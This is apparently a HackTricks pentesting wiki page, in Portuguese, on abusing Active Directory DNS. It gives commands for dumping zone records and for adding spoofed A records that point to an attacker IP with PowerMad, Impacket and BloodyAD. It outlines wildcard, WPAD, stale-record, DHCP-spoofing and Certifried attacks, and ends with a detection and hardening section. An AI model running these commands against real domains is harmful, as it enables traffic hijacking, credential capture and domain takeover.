# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Por padrão, **qualquer usuário** no Active Directory pode **enumerar todos os registros DNS** nas zonas DNS do Domínio ou da Floresta, semelhante a uma transferência de zona (os usuários podem listar os objetos filhos de uma zona DNS em um ambiente AD).

A ferramenta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite a **enumeração** e **exportação** de **todos os registros DNS** na zona para fins de reconhecimento de redes internas.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Abril de 2025) adiciona saída JSON/Greppable (`--json`), resolução DNS multi-threaded e suporte para TLS 1.2/1.3 ao se vincular ao LDAPS

Para mais informações, leia [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Criando / Modificando registros (spoofing ADIDNS)

Porque o grupo **Authenticated Users** tem **Create Child** no DACL da zona por padrão, qualquer conta de domínio (ou conta de computador) pode registrar registros adicionais. Isso pode ser usado para sequestro de tráfego, coerção de relay NTLM ou até mesmo comprometimento total do domínio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py é fornecido com Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas de ataque comuns

1. **Registro curinga** – `*.<zone>` transforma o servidor DNS do AD em um respondedor em toda a empresa, semelhante ao spoofing LLMNR/NBNS. Pode ser abusado para capturar hashes NTLM ou para retransmiti-los para LDAP/SMB.  (Requer que a pesquisa WINS esteja desativada.)
2. **Sequestro WPAD** – adicione `wpad` (ou um registro **NS** apontando para um host atacante para contornar a Lista de Bloqueio de Consulta Global) e faça proxy transparente de solicitações HTTP de saída para coletar credenciais.  A Microsoft corrigiu as contornações de curinga/DNAME (CVE-2018-8320), mas **registros NS ainda funcionam**.
3. **Tomada de entrada obsoleta** – reivindique o endereço IP que anteriormente pertencia a uma estação de trabalho e a entrada DNS associada ainda será resolvida, permitindo delegação restrita baseada em recursos ou ataques de Credenciais-Sombra sem tocar no DNS.
4. **Spoofing DHCP → DNS** – em uma implantação padrão do Windows DHCP+DNS, um atacante não autenticado na mesma sub-rede pode sobrescrever qualquer registro A existente (incluindo Controladores de Domínio) enviando solicitações DHCP forjadas que acionam atualizações dinâmicas de DNS (Akamai “DDSpoof”, 2023).  Isso dá acesso de máquina no meio sobre Kerberos/LDAP e pode levar à tomada total do domínio.
5. **Certifried (CVE-2022-26923)** – altere o `dNSHostName` de uma conta de máquina que você controla, registre um registro A correspondente e, em seguida, solicite um certificado para esse nome para se passar pelo DC. Ferramentas como **Certipy** ou **BloodyAD** automatizam totalmente o fluxo.

---

## Detecção e endurecimento

* Negar a **Usuários Autenticados** o direito de *Criar todos os objetos filhos* em zonas sensíveis e delegar atualizações dinâmicas a uma conta dedicada usada pelo DHCP.
* Se atualizações dinâmicas forem necessárias, defina a zona como **Apenas Segura** e ative a **Proteção de Nome** no DHCP para que apenas o objeto de computador proprietário possa sobrescrever seu próprio registro.
* Monitore os IDs de evento do servidor DNS 257/252 (atualização dinâmica), 770 (transferência de zona) e gravações LDAP em `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloqueie nomes perigosos (`wpad`, `isatap`, `*`) com um registro intencionalmente benigno ou via a Lista de Bloqueio de Consulta Global.
* Mantenha os servidores DNS atualizados – por exemplo, bugs RCE CVE-2024-26224 e CVE-2024-26231 alcançaram **CVSS 9.8** e são exploráveis remotamente contra Controladores de Domínio.

## Referências

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, ainda a referência de fato para ataques de curinga/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dez 2023)
{{#include ../../banners/hacktricks-training.md}}
